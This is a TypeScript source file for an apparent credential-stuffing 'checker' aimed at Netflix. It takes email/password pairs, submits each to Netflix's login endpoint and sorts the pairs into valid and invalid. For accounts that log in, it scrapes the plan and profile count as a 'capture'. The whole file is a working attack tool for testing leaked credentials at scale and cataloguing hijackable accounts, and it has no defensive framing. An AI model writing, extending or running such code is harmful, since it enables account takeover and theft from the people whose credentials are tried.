import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class NetflixChecker extends BaseChecker {
  async check(email: string, password: string): Promise<CheckResult> {
    try {
      // Get auth URL
      const authUrlResponse = await this.client.get('https://www.netflix.com/login');
      const authUrl = authUrlResponse.data.match(/authURL":"([^"]+)"/)?.[1];

      if (!authUrl) {
        throw new Error('Failed to get auth URL');
      }

      // Login attempt
      const loginResponse = await this.client.post(
        `https://www.netflix.com/${authUrl}`,
        {
          userLoginId: email,
          password: password,
          rememberMe: true,
          flow: 'websiteSignUp',
          mode: 'login',
          action: 'loginAction',
          withFields: 'rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode',
        },
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
        }
      );

      if (loginResponse.data?.authURL) {
        // Get account details
        const capture = await this.getAccountDetails();
        
        return this.createResult(email, password, 'netflix', 'valid', capture);
      }

      return this.createResult(email, password, 'netflix', 'invalid');
    } catch (error: any) {
      return this.createResult(
        email,
        password,
        'netflix',
        'error',
        undefined,
        error.message
      );
    }
  }

  private async getAccountDetails() {
    try {
      const response = await this.client.get('https://www.netflix.com/YourAccount');
      
      // Parse account info from response
      const planMatch = response.data.match(/membershipPlan[^:]*:\s*"([^"]+)"/);
      const profilesMatch = response.data.match(/profilesList[^[]*\[([^\]]+)\]/);
      
      return {
        plan: planMatch?.[1],
        screenCount: profilesMatch ? profilesMatch[1].split(',').length : 1,
      };
    } catch {
      return {};
    }
  }
}
